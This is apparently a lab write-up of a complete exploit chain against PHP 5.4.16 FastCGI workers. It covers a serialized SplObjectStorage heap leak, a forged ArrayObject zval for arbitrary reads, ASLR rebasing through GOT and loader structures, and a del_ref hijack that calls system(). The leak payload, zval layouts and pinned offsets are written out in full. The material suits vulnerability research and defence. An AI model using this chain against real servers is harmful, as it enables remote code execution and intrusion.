# Heap leak, arbitrary read, ASLR rebase, and 176-byte RCE

This document describes the complete chain reproduced by
`lab/centos7/verify_aslr_chain.py`.  It is a local, build-pinned reconstruction;
there are no site names, application routes, credentials, or deployment-specific
parameters in the implementation.

## Chain summary

```text
101-byte SplObjectStorage leak
    -> heap pointer
176-byte ArrayObject IS_STRING payload
    -> 4 KiB heap read
heap _zval_ptr_dtor pointer
    -> PHP PIE base
PHP iconv@GOT
    -> libc base
PHP DT_DEBUG
    -> loader base
loader _rtld_global+0xf00
    -> pthread_mutex_lock pointer
pthread __libc_system GOT
    -> verified libc system address
176-byte ArrayObject IS_OBJECT/del_ref payload
    -> system(">/x/<random>")
```

The resolver does not read `/proc/<pid>/maps` or `/proc/<pid>/mem`.  Its only
runtime address inputs are the leak and arbitrary-read responses.  Static symbol,
relocation, Build ID, and file-hash constants come from the pinned files listed
in `lab/centos7/rebase_profile.json`.

## 1. Heap pointer bootstrap

The first body is a 101-byte `SplObjectStorage` serialization stream:

```text
a:1:{i:0;a:3:{i:2;C:16:"SplObjectStorage":34:{x:i:1;O:8:"stdClass":0:{};m:a:0:{}}i:0;R:4;i:1;a:0:{}}}
```

Its invariant SHA-256 is:

```text
fea349754f36eef44590f408663d73763add52a4b979289a352c5e6b0e5f9639
```

The vulnerable PHP 5.4.16 worker returns the dangling zval value as a decimal
heap pointer.  A single-worker FPM pool keeps the leak and all dependent reads in
the same address-space generation.

This bootstrap uses the separate `SplObjectStorage` unserialize issue reported as
PHP #70168.  The arbitrary-read and final handler dispatch use the
`ArrayObject` #70155/#70166 vector.  Both belong to the CVE-2015-6831 issue
family, but their roles in the chain are kept distinct.

## 2. 176-byte arbitrary-read payload

The #70166 lifetime error allows a later 24-byte serialized string allocation to
replace the freed zval.  For a read, those bytes encode an `IS_STRING` zval:

| Offset | Size | Field |
|---:|---:|---|
| `0x00` | 8 | mapped address |
| `0x08` | 4 | byte length |
| `0x0c` | 4 | string padding/hash field |
| `0x10` | 4 | `refcount = 0x100` |
| `0x14` | 1 | `IS_STRING = 6` |
| `0x15` | 3 | flags/padding |

The complete serialized body remains 176 bytes.  The lab output fixture hex
encodes the forged string, so every returned byte is preserved without making
the address resolver depend on an HTML template or character-set behavior.

`poc/lossy_utf8.py` separately retains the bounded U+FFFD/wildcard recovery used
when a rendering layer decodes arbitrary bytes as UTF-8 with replacement.  That
codec is not required by the deterministic local integration run.

## 3. PHP PIE base from the heap

The resolver reads 4096 bytes from the leaked heap address and scans aligned
qwords for the exported `_zval_ptr_dtor` pointer.  In the pinned PHP-FPM binary:

```text
_zval_ptr_dtor = PHP base + 0x257590
```

For each canonical executable-looking pointer, the resolver subtracts
`0x257590` and retains page-aligned candidates.  The integration case requires
exactly one candidate, then verifies it by reading:

1. `PHP base + 0x0`: ELF magic `7f454c46`;
2. `PHP base + 0x284`: Build ID
   `5507cb5a8ebcc74a9eb83787d4f0b967f2c6b8ba`.

A pointer shape alone is therefore insufficient to advance the state machine.

## 4. libc from PHP `iconv@GOT`

The pinned PHP-FPM relocation is:

```text
PHP base + 0x65cc18 -> iconv
```

The resolver reads this qword and subtracts the exact libc symbol offset:

```text
libc base = observed iconv pointer - 0x22ba0
```

It then requires ELF magic and libc Build ID
`f9fafde281e0e0e2af45911ad0fa115b64c2cea8` at the calculated base.

## 5. loader from `DT_DEBUG`

The runtime linker writes `_r_debug` into PHP's `DT_DEBUG` slot:

```text
PHP DT_DEBUG slot = PHP base + 0x65b6a8
loader base       = observed _r_debug - 0x223120
```

The calculated loader base is checked using ELF magic and Build ID
`f661f01d5570d658ef1ee970fe90d894b636f15a`.

## 6. libpthread from `_rtld_global`

For the pinned loader:

```text
_rtld_global                  = loader base + 0x222000
pthread pointer slot          = _rtld_global + 0xf00
observed pointer target       = pthread_mutex_lock
pthread_mutex_lock offset     = 0x9d00
pthread base                  = observed pointer - 0x9d00
```

The resolver again requires ELF magic and libpthread Build ID
`2b482b3bae79def4e5bc9791bc6bbdae0e93e359`.

This avoids assuming a stale absolute base and avoids walking an unbounded
`link_map` list.

## 7. System slot proof

The pinned libpthread has this relocation:

```text
libpthread base + 0x217088 -> __libc_system@GLIBC_PRIVATE
```

The resolver reads that slot and requires:

```text
observed slot value == libc base + 0x432c0
```

Only after this equality, all four ELF headers, and all four Build IDs have been
confirmed does the runner construct the execution payload.

## 8. Final `del_ref` dispatch

The execution form replaces the freed zval with:

| Offset | Size | Field |
|---:|---:|---|
| `0x00` | 8 | 1–7 byte ASCII command plus NUL |
| `0x08` | 8 | fake handler table pointer |
| `0x10` | 4 | `refcount = 1` |
| `0x14` | 1 | `IS_OBJECT = 5` |
| `0x15` | 3 | flags/padding |

`refcount = 1` sends destruction directly through `zval_dtor()` and
`handlers->del_ref(zval *)`.  Since `del_ref` is the handler table's second
qword:

```text
handlers = address_of_system_GOT_slot - 8
```

The zval pointer is the first AMD64 ABI argument, so the inline qword becomes the
`system()` command.  The integration runner uses a meaningless random
three-hex marker and a seven-byte command of the form `>/x/abc`.

The worker normally faults after `system()` returns because the forged zval is
not a valid standalone object allocation.  Success therefore requires all of:

- marker absent before the trigger;
- marker created as a zero-byte file;
- trigger connection reset;
- exploited FPM worker exited;
- replacement worker created.

## Request budget and hard stops

The deterministic integration run uses 15 FastCGI requests:

| Stage | Requests |
|---|---:|
| heap leak | 1 |
| 4096-byte heap read | 1 |
| PHP ELF and Build ID | 2 |
| `iconv@GOT`, libc ELF and Build ID | 3 |
| `DT_DEBUG`, loader ELF and Build ID | 3 |
| `_rtld_global` pointer, pthread ELF and Build ID | 3 |
| system GOT | 1 |
| final trigger | 1 |

Any malformed response, short read, non-page-aligned base, hash mismatch, Build
ID mismatch, ELF mismatch, or system-slot mismatch stops the chain before the
execution payload is sent.
